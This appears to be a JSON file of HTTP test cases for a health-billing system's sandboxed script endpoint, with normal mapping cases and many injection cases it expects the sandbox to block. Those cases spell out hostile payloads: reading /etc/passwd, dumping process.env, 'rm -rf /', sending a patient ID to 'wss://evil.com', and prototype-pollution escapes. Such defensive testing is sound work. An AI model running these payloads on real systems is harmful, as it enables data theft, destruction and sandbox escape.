@@ -1,0 +1,468 @@
+{
+  "_instrucciones": {
+    "base_url": "http://localhost:3000/ws/entity-script",
+    "header_auth": "fuagentoken: <TU_TOKEN>",
+    "como_usar": "Cada objeto es un request HTTP. Copiar el body al cliente HTTP (Postman, Thunder Client, etc). Los casos marcados expect_success:false deben ser rechazados por el sistema."
+  },
+
+  "1_CRUD": {
+    "1a_crear_script_valido": {
+      "method": "POST",
+      "url": "/ws/entity-script",
+      "body": {
+        "name": "actualizar_paciente_fua",
+        "description": "Llena datos del paciente en el FUA desde payload de visita",
+        "scriptContent": "entity.pacienteNombre = payload.nombres + ' ' + payload.apellidos;\nentity.pacienteDNI = payload.dni;\nentity.fechaAtencion = payload.fechaVisita;\nentity.diagnostico = payload.codigoDiagnostico;",
+        "targetEntity": "FUAFormat",
+        "maxChars": 2000,
+        "maxTimeMs": 1000,
+        "createdBy": "test-user"
+      },
+      "expect_success": true
+    },
+    "1b_crear_script_con_require": {
+      "method": "POST",
+      "url": "/ws/entity-script",
+      "body": {
+        "name": "script_malicioso_require",
+        "description": "Intenta usar require",
+        "scriptContent": "var fs = require('fs'); entity.x = fs.readFileSync('/etc/passwd');",
+        "targetEntity": "FUAFormat",
+        "createdBy": "test-user"
+      },
+      "expect_success": false,
+      "expect_error": "bloqueado detectado: \"require\""
+    },
+    "1c_crear_script_con_process": {
+      "method": "POST",
+      "url": "/ws/entity-script",
+      "body": {
+        "name": "script_malicioso_process",
+        "description": "Intenta acceder a process",
+        "scriptContent": "entity.env = process.env;",
+        "targetEntity": "FUAFormat",
+        "createdBy": "test-user"
+      },
+      "expect_success": false,
+      "expect_error": "bloqueado detectado: \"process\""
+    }
+  },
+
+  "2_EJECUCION_AD_HOC": {
+    "2a_caso_feliz_asignacion_simple": {
+      "method": "POST",
+      "url": "/ws/entity-script/execute",
+      "body": {
+        "entity": {
+          "pacienteNombre": "",
+          "pacienteDNI": "",
+          "fechaAtencion": "",
+          "diagnostico": "",
+          "establecimiento": ""
+        },
+        "payload": {
+          "nombres": "IGNACIO",
+          "apellidos": "TORRES CUETO",
+          "dni": "58147747",
+          "fechaVisita": "2026-03-25",
+          "codigoDiagnostico": "J00",
+          "nombreEstablecimiento": "HOSPITAL II-1 SANTA CLOTILDE"
+        },
+        "script": "entity.pacienteNombre = payload.nombres + ' ' + payload.apellidos;\nentity.pacienteDNI = payload.dni;\nentity.fechaAtencion = payload.fechaVisita;\nentity.diagnostico = payload.codigoDiagnostico;\nentity.establecimiento = payload.nombreEstablecimiento;"
+      },
+      "expect_success": true,
+      "expect_entity": {
+        "pacienteNombre": "IGNACIO TORRES CUETO",
+        "pacienteDNI": "58147747",
+        "diagnostico": "J00"
+      }
+    },
+
+    "2b_caso_feliz_logica_condicional": {
+      "method": "POST",
+      "url": "/ws/entity-script/execute",
+      "body": {
+        "entity": {
+          "grupo": "",
+          "cobertura": "",
+          "requiereAutorizacion": false
+        },
+        "payload": {
+          "edad": 7,
+          "tieneSeguroSIS": true,
+          "montoTotal": 15000
+        },
+        "script": "if (payload.edad >= 18) {\n  entity.grupo = 'ADULTO';\n} else if (payload.edad >= 12) {\n  entity.grupo = 'ADOLESCENTE';\n} else {\n  entity.grupo = 'PEDIATRICO';\n}\nentity.cobertura = payload.tieneSeguroSIS ? 'SIS' : 'PARTICULAR';\nentity.requiereAutorizacion = payload.montoTotal > 10000;"
+      },
+      "expect_success": true,
+      "expect_entity": {
+        "grupo": "PEDIATRICO",
+        "cobertura": "SIS",
+        "requiereAutorizacion": true
+      }
+    },
+
+    "2c_caso_feliz_mapeo_diagnosticos": {
+      "method": "POST",
+      "url": "/ws/entity-script/execute",
+      "body": {
+        "entity": {
+          "diagnosticoPrincipal": "",
+          "diagnosticoSecundario": "",
+          "totalDiagnosticos": 0
+        },
+        "payload": {
+          "diagnosticos": [
+            { "codigo": "J00", "descripcion": "RINOFARINGITIS AGUDA", "tipo": "DEFINITIVO" },
+            { "codigo": "R50.9", "descripcion": "FIEBRE NO ESPECIFICADA", "tipo": "PRESUNTIVO" }
+          ]
+        },
+        "script": "entity.totalDiagnosticos = payload.diagnosticos.length;\nif (payload.diagnosticos.length > 0) {\n  entity.diagnosticoPrincipal = payload.diagnosticos[0].codigo;\n}\nif (payload.diagnosticos.length > 1) {\n  entity.diagnosticoSecundario = payload.diagnosticos[1].codigo;\n}"
+      },
+      "expect_success": true,
+      "expect_entity": {
+        "diagnosticoPrincipal": "J00",
+        "diagnosticoSecundario": "R50.9",
+        "totalDiagnosticos": 2
+      }
+    },
+
+    "2d_caso_feliz_formatDate": {
+      "method": "POST",
+      "url": "/ws/entity-script/execute",
+      "body": {
+        "entity": {
+          "fechaRegistro": "",
+          "fechaFormateada": ""
+        },
+        "payload": {
+          "fechaISO": "2026-03-25T10:37:40.000+0000"
+        },
+        "script": "entity.fechaRegistro = formatDate(Date.now());\nentity.fechaFormateada = formatDate(payload.fechaISO);"
+      },
+      "expect_success": true
+    },
+
+    "2e_caso_feliz_calculos_montos": {
+      "method": "POST",
+      "url": "/ws/entity-script/execute",
+      "body": {
+        "entity": {
+          "montoMedicamentos": 0,
+          "montoInsumos": 0,
+          "montoProcedimientos": 0,
+          "montoTotal": 0
+        },
+        "payload": {
+          "medicamentos": [
+            { "nombre": "Paracetamol 500mg", "precio": 2.50, "cantidad": 10 },
+            { "nombre": "Amoxicilina 500mg", "precio": 5.00, "cantidad": 21 }
+          ],
+          "insumos": [
+            { "nombre": "Jeringa 5ml", "precio": 0.80, "cantidad": 3 }
+          ],
+          "procedimientos": [
+            { "nombre": "Consulta ambulatoria", "precio": 30.00 }
+          ]
+        },
+        "script": "var totalMed = 0;\nfor (var i = 0; i < payload.medicamentos.length; i++) {\n  totalMed = totalMed + (payload.medicamentos[i].precio * payload.medicamentos[i].cantidad);\n}\nentity.montoMedicamentos = totalMed;\n\nvar totalIns = 0;\nfor (var j = 0; j < payload.insumos.length; j++) {\n  totalIns = totalIns + (payload.insumos[j].precio * payload.insumos[j].cantidad);\n}\nentity.montoInsumos = totalIns;\n\nvar totalProc = 0;\nfor (var k = 0; k < payload.procedimientos.length; k++) {\n  totalProc = totalProc + payload.procedimientos[k].precio;\n}\nentity.montoProcedimientos = totalProc;\nentity.montoTotal = totalMed + totalIns + totalProc;"
+      },
+      "expect_success": true,
+      "expect_entity": {
+        "montoMedicamentos": 130,
+        "montoInsumos": 2.4000000000000004,
+        "montoProcedimientos": 30,
+        "montoTotal": 162.4000000000000
+      }
+    }
+  },
+
+  "3_INYECCION_KEYWORDS": {
+    "3a_require_fs": {
+      "method": "POST",
+      "url": "/ws/entity-script/execute",
+      "body": {
+        "entity": {},
+        "payload": {},
+        "script": "var fs = require('fs'); entity.data = fs.readFileSync('/etc/passwd', 'utf8');"
+      },
+      "expect_success": false,
+      "expect_error": "bloqueado detectado: \"require\""
+    },
+    "3b_process_env": {
+      "method": "POST",
+      "url": "/ws/entity-script/execute",
+      "body": {
+        "entity": {},
+        "payload": {},
+        "script": "entity.secrets = process.env;"
+      },
+      "expect_success": false,
+      "expect_error": "bloqueado detectado: \"process\""
+    },
+    "3c_eval": {
+      "method": "POST",
+      "url": "/ws/entity-script/execute",
+      "body": {
+        "entity": {},
+        "payload": {},
+        "script": "eval('entity.x = 1');"
+      },
+      "expect_success": false,
+      "expect_error": "bloqueado detectado: \"eval\""
+    },
+    "3d_Function_constructor": {
+      "method": "POST",
+      "url": "/ws/entity-script/execute",
+      "body": {
+        "entity": {},
+        "payload": {},
+        "script": "var fn = new Function('return 1'); entity.data = fn();"
+      },
+      "expect_success": false,
+      "expect_error": "bloqueado detectado: \"Function\""
+    },
+    "3e_fetch_exfiltrar_datos": {
+      "method": "POST",
+      "url": "/ws/entity-script/execute",
+      "body": {
+        "entity": {},
+        "payload": { "dni": "58147747" },
+        "script": "fetch('/api/steal?dni=' + payload.dni);"
+      },
+      "expect_success": false,
+      "expect_error": "bloqueado detectado: \"fetch\""
+    },
+    "3f_child_process_exec": {
+      "method": "POST",
+      "url": "/ws/entity-script/execute",
+      "body": {
+        "entity": {},
+        "payload": {},
+        "script": "var cp = child_process; cp.exec('rm -rf /');"
+      },
+      "expect_success": false,
+      "expect_error": "bloqueado detectado: \"child_process\""
+    },
+    "3g_import_dinamico": {
+      "method": "POST",
+      "url": "/ws/entity-script/execute",
+      "body": {
+        "entity": {},
+        "payload": {},
+        "script": "import('fs').then(function(m) { entity.data = m.readFileSync('/etc/passwd'); });"
+      },
+      "expect_success": false,
+      "expect_error": "bloqueado detectado: \"import\""
+    },
+    "3h_setTimeout_evasion": {
+      "method": "POST",
+      "url": "/ws/entity-script/execute",
+      "body": {
+        "entity": {},
+        "payload": {},
+        "script": "setTimeout(function() { entity.x = 'delayed'; }, 0);"
+      },
+      "expect_success": false,
+      "expect_error": "bloqueado detectado: \"setTimeout\""
+    },
+    "3i_globalThis": {
+      "method": "POST",
+      "url": "/ws/entity-script/execute",
+      "body": {
+        "entity": {},
+        "payload": {},
+        "script": "entity.keys = globalThis;"
+      },
+      "expect_success": false,
+      "expect_error": "bloqueado detectado: \"globalThis\""
+    },
+    "3j_Proxy_intercept": {
+      "method": "POST",
+      "url": "/ws/entity-script/execute",
+      "body": {
+        "entity": {},
+        "payload": {},
+        "script": "var p = new Proxy(entity, { get: function(t, k) { return 'intercepted'; } });"
+      },
+      "expect_success": false,
+      "expect_error": "bloqueado detectado: \"Proxy\""
+    },
+    "3k_Reflect": {
+      "method": "POST",
+      "url": "/ws/entity-script/execute",
+      "body": {
+        "entity": {},
+        "payload": {},
+        "script": "var keys = Reflect.ownKeys(entity);"
+      },
+      "expect_success": false,
+      "expect_error": "bloqueado detectado: \"Reflect\""
+    },
+    "3l_WebSocket_exfiltrar": {
+      "method": "POST",
+      "url": "/ws/entity-script/execute",
+      "body": {
+        "entity": {},
+        "payload": { "dni": "58147747" },
+        "script": "var ws = new WebSocket('wss://evil.com'); ws.send(payload.dni);"
+      },
+      "expect_success": false,
+      "expect_error": "bloqueado detectado: \"WebSocket\""
+    }
+  },
+
+  "4_INYECCION_PATRONES_PELIGROSOS": {
+    "4a_proto_pollution": {
+      "method": "POST",
+      "url": "/ws/entity-script/execute",
+      "body": {
+        "entity": {},
+        "payload": {},
+        "script": "entity.__proto__.isAdmin = true;"
+      },
+      "expect_success": false,
+      "expect_error": "peligroso detectado: __proto__"
+    },
+    "4b_constructor_bracket": {
+      "method": "POST",
+      "url": "/ws/entity-script/execute",
+      "body": {
+        "entity": {},
+        "payload": {},
+        "script": "var ctor = entity.constructor['constructor']; ctor('return this')();"
+      },
+      "expect_success": false,
+      "expect_error": "peligroso detectado: constructor"
+    },
+    "4c_prototype_override": {
+      "method": "POST",
+      "url": "/ws/entity-script/execute",
+      "body": {
+        "entity": {},
+        "payload": {},
+        "script": "String.prototype.toUpperCase = function() { return 'hacked'; };"
+      },
+      "expect_success": false,
+      "expect_error": "peligroso detectado:"
+    },
+    "4d_this_escape": {
+      "method": "POST",
+      "url": "/ws/entity-script/execute",
+      "body": {
+        "entity": {},
+        "payload": {},
+        "script": "var ctx = this; entity.escaped = ctx;"
+      },
+      "expect_success": false,
+      "expect_error": "peligroso detectado:"
+    }
+  },
+
+  "5_INYECCION_EN_COMENTARIOS": {
+    "5a_keyword_en_comentario_linea_permitido": {
+      "method": "POST",
+      "url": "/ws/entity-script/execute",
+      "body": {
+        "entity": { "x": 0 },
+        "payload": {},
+        "script": "// require('fs') - esto es un comentario\nentity.x = 1;"
+      },
+      "expect_success": true,
+      "expect_entity": { "x": 1 }
+    },
+    "5b_keyword_en_comentario_bloque_permitido": {
+      "method": "POST",
+      "url": "/ws/entity-script/execute",
+      "body": {
+        "entity": { "x": 0 },
+        "payload": {},
+        "script": "/* require('fs') - bloque comentado */\nentity.x = 42;"
+      },
+      "expect_success": true,
+      "expect_entity": { "x": 42 }
+    },
+    "5c_keyword_fuera_de_comentario_bloqueado": {
+      "method": "POST",
+      "url": "/ws/entity-script/execute",
+      "body": {
+        "entity": {},
+        "payload": {},
+        "script": "/* comentario inocente */ require('fs');"
+      },
+      "expect_success": false,
+      "expect_error": "bloqueado detectado: \"require\""
+    }
+  },
+
+  "6_TIMEOUT_Y_LIMITES": {
+    "6a_loop_infinito": {
+      "method": "POST",
+      "url": "/ws/entity-script/execute",
+      "body": {
+        "entity": {},
+        "payload": {},
+        "script": "while(true) { }",
+        "maxTimeMs": 200
+      },
+      "expect_success": false,
+      "expect_error": "tiempo máximo de ejecución"
+    },
+    "6b_script_excede_maxChars": {
+      "method": "POST",
+      "url": "/ws/entity-script/execute",
+      "body": {
+        "entity": {},
+        "payload": {},
+        "script": "entity.x = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';",
+        "maxChars": 50
+      },
+      "expect_success": false,
+      "expect_error": "excede el límite"
+    },
+    "6c_script_vacio": {
+      "method": "POST",
+      "url": "/ws/entity-script/execute",
+      "body": {
+        "entity": {},
+        "payload": {},
+        "script": ""
+      },
+      "expect_success": false,
+      "expect_error": "vacío"
+    }
+  },
+
+  "7_ERRORES_DE_EJECUCION": {
+    "7a_sintaxis_invalida": {
+      "method": "POST",
+      "url": "/ws/entity-script/execute",
+      "body": {
+        "entity": {},
+        "payload": {},
+        "script": "entity.x = ;"
+      },
+      "expect_success": false
+    },
+    "7b_variable_no_definida": {
+      "method": "POST",
+      "url": "/ws/entity-script/execute",
+      "body": {
+        "entity": {},
+        "payload": {},
+        "script": "entity.x = variableQueNoExiste;"
+      },
+      "expect_success": false
+    },
+    "7c_null_access": {
+      "method": "POST",
+      "url": "/ws/entity-script/execute",
+      "body": {
+        "entity": {},
+        "payload": { "a": null },
+        "script": "entity.x = payload.a.b.c;"
+      },
+      "expect_success": false
+    }
+  }
+}
